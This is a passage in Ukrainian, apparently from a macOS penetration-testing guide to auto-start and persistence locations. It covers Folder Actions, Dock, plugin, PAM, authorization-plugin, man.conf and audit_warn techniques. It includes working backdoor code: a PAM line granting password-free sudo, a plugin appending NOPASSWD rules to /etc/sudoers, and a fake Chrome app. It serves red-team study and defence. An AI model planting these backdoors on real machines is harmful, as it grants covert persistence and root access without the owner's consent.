Якщо ми надрукуємо файл завдання, ми виявимо, що він містить ту ж інформацію, яку ми отримали за допомогою `at -c`.

### Дії з папками

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але вам потрібно мати можливість викликати `osascript` з аргументами, щоб зв'язатися з **`System Events`**, щоб налаштувати Дії з папками
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Має деякі базові дозволи TCC, такі як Робочий стіл, Документи та Завантаження

#### Місцезнаходження

- **`/Library/Scripts/Folder Action Scripts`**
- Потрібен доступ адміністратора
- **Тригер**: Доступ до вказаної папки
- **`~/Library/Scripts/Folder Action Scripts`**
- **Тригер**: Доступ до вказаної папки

#### Опис та експлуатація

Дії з папками - це скрипти, які автоматично запускаються при змінах у папці, таких як додавання, видалення елементів або інші дії, такі як відкриття або зміна розміру вікна папки. Ці дії можна використовувати для різних завдань і їх можна активувати різними способами, такими як використання інтерфейсу Finder або команд терміналу.

Щоб налаштувати Дії з папками, у вас є кілька варіантів:

1. Створення робочого процесу Дії з папками за допомогою [Automator](https://support.apple.com/guide/automator/welcome/mac) та встановлення його як служби.
2. Прикріплення скрипта вручну через Налаштування Дій з папками в контекстному меню папки.
3. Використання OSAScript для надсилання повідомлень Apple Event до `System Events.app` для програмного налаштування Дії з папками.
- Цей метод особливо корисний для вбудовування дії в систему, що забезпечує рівень стійкості.

Наступний скрипт є прикладом того, що може бути виконано за допомогою Дії з папками:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Щоб зробити вищезгаданий скрипт придатним для Дій Папки, скомпілюйте його за допомогою:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Після компіляції скрипта налаштуйте Дії папок, виконавши нижче наведений скрипт. Цей скрипт дозволить Дії папок глобально та спеціально прикріпить раніше скомпільований скрипт до папки Робочий стіл.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Запустіть скрипт налаштування за допомогою:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Це спосіб реалізації цієї стійкості через GUI:

Це скрипт, який буде виконано:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Скомпілюйте його за допомогою: `osacompile -l JavaScript -o folder.scpt source.js`

Перемістіть його до:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Потім відкрийте додаток `Folder Actions Setup`, виберіть **папку, яку ви хочете спостерігати** і виберіть у вашому випадку **`folder.scpt`** (в моєму випадку я назвав його output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Тепер, якщо ви відкриєте цю папку за допомогою **Finder**, ваш скрипт буде виконано.

Ця конфігурація зберігалася в **plist**, розташованому в **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** у форматі base64.

Тепер спробуємо підготувати цю стійкість без доступу до GUI:

1. **Скопіюйте `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** до `/tmp`, щоб зробити резервну копію:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Видаліть** дії папок, які ви щойно налаштували:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Тепер, коли у нас є порожнє середовище

3. Скопіюйте резервну копію: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Відкрийте Folder Actions Setup.app, щоб використати цю конфігурацію: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> І це не спрацювало для мене, але це інструкції з опису:(

### Dock shortcuts

Опис: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але вам потрібно мати встановлений шкідливий додаток у системі
- TCC обход: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Тригер**: Коли користувач натискає на додаток у доку

#### Опис та експлуатація

Усі програми, які з'являються в Dock, вказані в plist: **`~/Library/Preferences/com.apple.dock.plist`**

Можна **додати програму** просто з:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Використовуючи деякі **соціальні інженерії**, ви могли б **видавати себе, наприклад, за Google Chrome** всередині дока і насправді виконати свій власний скрипт:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Вибір кольорів

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Потрібно, щоб відбулася дуже специфічна дія
- Ви опинитеся в іншій пісочниці
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Локація

- `/Library/ColorPickers`
- Потрібен root
- Тригер: Використовуйте вибір кольору
- `~/Library/ColorPickers`
- Тригер: Використовуйте вибір кольору

#### Опис та експлуатація

**Скомпіліруйте пакет вибору кольору** з вашим кодом (ви можете використовувати [**цей, наприклад**](https://github.com/viktorstrate/color-picker-plus)) і додайте конструктор (як у [розділі Збереження екрана](macos-auto-start-locations.md#screen-saver)) та скопіюйте пакет до `~/Library/ColorPickers`.

Тоді, коли вибір кольору буде активовано, ваш код також повинен бути активований.

Зверніть увагу, що двійковий файл, що завантажує вашу бібліотеку, має **дуже обмежену пісочницю**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Корисно для обходу пісочниці: **Ні, тому що вам потрібно виконати свій власний додаток**
- Обхід TCC: ???

#### Location

- Конкретний додаток

#### Description & Exploit

Приклад програми з розширенням Finder Sync [**можна знайти тут**](https://github.com/D00MFist/InSync).

Додатки можуть мати `Finder Sync Extensions`. Це розширення буде входити в додаток, який буде виконано. Більше того, для того щоб розширення могло виконати свій код, воно **повинно бути підписане** дійсним сертифікатом розробника Apple, воно повинно бути **пісочницею** (хоча можуть бути додані пом'якшені винятки) і воно повинно бути зареєстроване з чимось на зразок:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Екранна заставка

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але ви опинитеся в загальній пісочниці додатків
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- `/System/Library/Screen Savers`
- Потрібен root
- **Тригер**: Виберіть екранну заставку
- `/Library/Screen Savers`
- Потрібен root
- **Тригер**: Виберіть екранну заставку
- `~/Library/Screen Savers`
- **Тригер**: Виберіть екранну заставку

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Опис та експлуатація

Створіть новий проект в Xcode і виберіть шаблон для генерації нової **екранної заставки**. Потім додайте свій код до нього, наприклад, наступний код для генерації логів.

**Зберігайте** його, і скопіюйте пакет `.saver` до **`~/Library/Screen Savers`**. Потім відкрийте GUI екранної заставки, і якщо ви просто натиснете на неї, вона повинна згенерувати багато логів:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Зверніть увагу, що через те, що всередині прав доступу бінарного файлу, який завантажує цей код (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), ви можете знайти **`com.apple.security.app-sandbox`**, ви будете **всередині загального пісочниці додатків**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але ви опинитеся в пісочниці програми
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
- Пісочниця виглядає дуже обмеженою

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Створено новий файл з розширенням, яке обробляється плагіном Spotlight.
- `/Library/Spotlight/`
- **Trigger**: Створено новий файл з розширенням, яке обробляється плагіном Spotlight.
- Потрібен root
- `/System/Library/Spotlight/`
- **Trigger**: Створено новий файл з розширенням, яке обробляється плагіном Spotlight.
- Потрібен root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Створено новий файл з розширенням, яке обробляється плагіном Spotlight.
- Потрібен новий додаток

#### Description & Exploitation

Spotlight — це вбудована функція пошуку macOS, призначена для надання користувачам **швидкого та всебічного доступу до даних на їхніх комп'ютерах**.\
Щоб полегшити цю швидку можливість пошуку, Spotlight підтримує **приватну базу даних** та створює індекс, **аналізуючи більшість файлів**, що дозволяє швидко шукати як за іменами файлів, так і за їх вмістом.

Основний механізм Spotlight включає центральний процес, названий 'mds', що означає **'сервер метаданих'.** Цей процес координує всю службу Spotlight. Доповнюючи це, є кілька демонів 'mdworker', які виконують різноманітні завдання обслуговування, такі як індексація різних типів файлів (`ps -ef | grep mdworker`). Ці завдання стають можливими завдяки плагінам імпортера Spotlight, або **".mdimporter bundles"**, які дозволяють Spotlight розуміти та індексувати вміст у різноманітних форматах файлів.

Плагіни або **`.mdimporter`** пакети розташовані в місцях, згаданих раніше, і якщо з'являється новий пакет, він завантажується протягом хвилини (немає потреби перезапускати будь-яку службу). Ці пакети повинні вказувати, які **типи файлів та розширення вони можуть обробляти**, таким чином, Spotlight використовуватиме їх, коли створюється новий файл з вказаним розширенням.

Можливо **знайти всі `mdimporters`**, які завантажені, запустивши:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
І, наприклад, **/Library/Spotlight/iBooksAuthor.mdimporter** використовується для парсингу таких типів файлів (розширення `.iba` та `.book` серед інших):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Якщо ви перевірите Plist інших `mdimporter`, ви можете не знайти запис **`UTTypeConformsTo`**. Це тому, що це вбудовані _Уніфіковані Ідентифікатори Типів_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) і не потрібно вказувати розширення.
>
> Більше того, системні плагіни за замовчуванням завжди мають пріоритет, тому зловмисник може отримати доступ лише до файлів, які не індексуються власними `mdimporters` Apple.

Щоб створити свій власний імпортер, ви можете почати з цього проекту: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) і потім змінити назву, **`CFBundleDocumentTypes`** та додати **`UTImportedTypeDeclarations`**, щоб він підтримував розширення, яке ви хочете підтримувати, і відобразити їх у **`schema.xml`**.\
Потім **змініть** код функції **`GetMetadataForFile`**, щоб виконати ваш payload, коли створюється файл з обробленим розширенням.

Нарешті, **зберіть і скопіюйте ваш новий `.mdimporter`** в одне з попередніх місць, і ви можете перевірити, чи він завантажується, **моніторячи журнали** або перевіряючи **`mdimport -L.`**

### ~~Панель налаштувань~~

> [!CAUTION]
> Схоже, що це більше не працює.

Запис: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Потрібна специфічна дія користувача
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Опис

Схоже, що це більше не працює.

## Обхід пісочниці Root

> [!TIP]
> Тут ви можете знайти стартові місця, корисні для **обходу пісочниці**, які дозволяють вам просто виконати щось, **записуючи це у файл**, будучи **root** і/або вимагаючи інших **незвичайних умов.**

### Періодичні

Запис: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Потрібен root
- **Тригер**: Коли настане час
- `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`
- Потрібен root
- **Тригер**: Коли настане час

#### Опис та експлуатація

Періодичні скрипти (**`/etc/periodic`**) виконуються через **демони запуску**, налаштовані в `/System/Library/LaunchDaemons/com.apple.periodic*`. Зверніть увагу, що скрипти, збережені в `/etc/periodic/`, **виконуються** як **власник файлу**, тому це не спрацює для потенційного підвищення привілеїв.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Існують інші періодичні скрипти, які будуть виконані, вказані в **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Якщо вам вдасться записати будь-який з файлів `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`, він буде **виконаний рано чи пізно**.

> [!WARNING]
> Зверніть увагу, що періодичний скрипт буде **виконаний від імені власника скрипта**. Тому, якщо звичайний користувач є власником скрипта, він буде виконаний від імені цього користувача (це може запобігти атакам підвищення привілеїв).

### PAM

Написання: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Написання: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- Завжди потрібен root

#### Опис та експлуатація

Оскільки PAM більше зосереджений на **постійності** та шкідливому ПЗ, ніж на простому виконанні в macOS, цей блог не надасть детального пояснення, **читайте написання, щоб краще зрозуміти цю техніку**.

Перевірте модулі PAM за допомогою:
```bash
ls -l /etc/pam.d
```
Техніка постійності/ескалації привілеїв, що зловживає PAM, така ж проста, як модифікація модуля /etc/pam.d/sudo, додавши на початку рядок:
```bash
auth       sufficient     pam_permit.so
```
Отже, це буде **виглядати** приблизно так:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
І тому будь-яка спроба використати **`sudo` буде успішною**.

> [!CAUTION]
> Зверніть увагу, що цей каталог захищений TCC, тому ймовірно, що користувач отримає запит на доступ.

Ще один хороший приклад - це su, де ви можете побачити, що також можливо передавати параметри модулям PAM (і ви також можете закласти бекдор у цей файл):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Плагіни авторизації

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root і зробити додаткові налаштування
- Обхід TCC: ???

#### Локація

- `/Library/Security/SecurityAgentPlugins/`
- Потрібен root
- Також потрібно налаштувати базу даних авторизації для використання плагіна

#### Опис та експлуатація

Ви можете створити плагін авторизації, який буде виконуватись під час входу користувача для підтримки постійності. Для отримання додаткової інформації про те, як створити один з цих плагінів, перегляньте попередні записи (і будьте обережні, погано написаний плагін може заблокувати вас, і вам потрібно буде очистити ваш Mac з режиму відновлення).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Перемістіть** пакет до місця, звідки його потрібно завантажити:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Нарешті додайте **правило** для завантаження цього плагіна:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** повідомить фреймворку авторизації, що йому потрібно **викликати зовнішній механізм для авторизації**. Більше того, **`privileged`** змусить його виконуватися від імені root.

Запустіть його за допомогою:
```bash
security authorize com.asdf.asdf
```
І тоді **група співробітників повинна мати доступ sudo** (прочитайте `/etc/sudoers`, щоб підтвердити).

### Man.conf

Написання: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root, і користувач повинен використовувати man
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- **`/private/etc/man.conf`**
- Потрібен root
- **`/private/etc/man.conf`**: Коли використовується man

#### Опис та експлуатація

Конфігураційний файл **`/private/etc/man.conf`** вказує бінарний файл/скрипт, який потрібно використовувати при відкритті файлів документації man. Отже, шлях до виконуваного файлу може бути змінений, щоб щоразу, коли користувач використовує man для читання документації, виконувалася зворотна програма. 

Наприклад, встановлено в **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
А потім створіть `/tmp/view` як:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root, і apache має бути запущений
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd не має прав

#### Location

- **`/etc/apache2/httpd.conf`**
- Потрібен root
- Тригер: Коли Apache2 запускається

#### Description & Exploit

Ви можете вказати в `/etc/apache2/httpd.conf`, щоб завантажити модуль, додавши рядок, наприклад:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Таким чином, ваш скомпільований модуль буде завантажено Apache. Єдине, що вам потрібно, це **підписати його дійсним сертифікатом Apple**, або вам потрібно **додати новий довірений сертифікат** в систему і **підписати його** з ним.

Тоді, якщо потрібно, щоб переконатися, що сервер буде запущено, ви можете виконати:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Приклад коду для Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM аудит фреймворк

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root, auditd має працювати і викликати попередження
- TCC обход: [🔴](https://emojipedia.org/large-red-circle)

#### Локація

- **`/etc/security/audit_warn`**
- Потрібен root
- **Тригер**: Коли auditd виявляє попередження

#### Опис та експлуатація

Коли auditd виявляє попередження, скрипт **`/etc/security/audit_warn`** **виконується**. Тож ви можете додати свій payload до нього.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Ви можете примусити попередження за допомогою `sudo audit -n`.

### Елементи автозавантаження

> [!CAUTION] > **Це застаріло, тому нічого не повинно бути знайдено в цих каталогах.**

**StartupItem** - це каталог, який повинен бути розташований або в `/Library/StartupItems/`, або в `/System/Library/StartupItems/`. Після створення цього каталогу він повинен містити два конкретні файли:

1. **rc скрипт**: shell-скрипт, що виконується під час завантаження.
2. **plist файл**, спеціально названий `StartupParameters.plist`, який містить різні налаштування конфігурації.

Переконайтеся, що як rc скрипт, так і файл `StartupParameters.plist` правильно розміщені в каталозі **StartupItem**, щоб процес завантаження міг їх розпізнати та використовувати.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Я не можу знайти цей компонент у своєму macOS, тому для отримання додаткової інформації перевірте опис

Опис: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Введений Apple, **emond** є механізмом ведення журналу, який, здається, недорозвинений або, можливо, покинутий, але все ще залишається доступним. Хоча це не особливо корисно для адміністратора Mac, ця невідома служба може слугувати тонким методом збереження для зловмисників, ймовірно, непоміченим більшістю адміністраторів macOS.

Для тих, хто знає про його існування, виявлення будь-якого зловмисного використання **emond** є простим. LaunchDaemon системи для цієї служби шукає скрипти для виконання в одному каталозі. Щоб перевірити це, можна використовувати наступну команду:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Потрібен root
- **Тригер**: З XQuartz

#### Опис та експлуатація

